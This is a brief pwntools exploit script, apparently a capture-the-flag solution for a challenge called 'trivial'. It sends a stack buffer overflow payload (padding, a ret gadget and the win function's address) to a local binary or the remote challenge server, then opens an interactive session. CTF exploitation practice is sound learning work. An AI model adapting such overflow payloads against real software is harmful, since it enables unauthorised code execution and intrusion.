from pwn import *

context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = './trivial'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  s = remote("tamuctf.com", 443, ssl=True, sni="trivial")
else:
  s = process(BINARY)

ret_addr = 0x401016 # ret;

buf  = b"A"*88
buf += p64(ret_addr)
buf += p64(elf.sym.win)
pause()
s.sendline(buf)

s.interactive()
